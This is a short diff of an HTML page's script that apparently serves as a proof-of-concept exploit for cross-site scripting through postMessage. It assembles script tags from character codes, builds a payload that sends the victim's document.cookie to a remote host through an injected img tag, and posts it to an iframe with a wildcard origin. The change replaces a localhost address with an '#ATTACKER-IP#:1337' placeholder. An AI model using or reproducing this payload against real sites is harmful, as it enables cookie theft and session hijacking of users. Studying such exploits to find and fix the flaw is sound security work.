@@ -20,7 +20,7 @@
     <script>
       var script      = String.fromCharCode(60,     115, 99, 114, 105, 112, 116, 62);
       var scriptclose = String.fromCharCode(60, 47, 115, 99, 114, 105, 112, 116, 62);
-      var payload = 'document.write("<img src=\'http://127.0.0.1:8080/"+document.cookie+"\' />")';
+      var payload = 'document.write("<img src=\'http://#ATTACKER-IP#:1337/"+document.cookie+"\' />")';
       function attack(){
         $("iframe")[0].contentWindow.postMessage("'/>"+script+payload+scriptclose+"<div id='comment","*");
       };
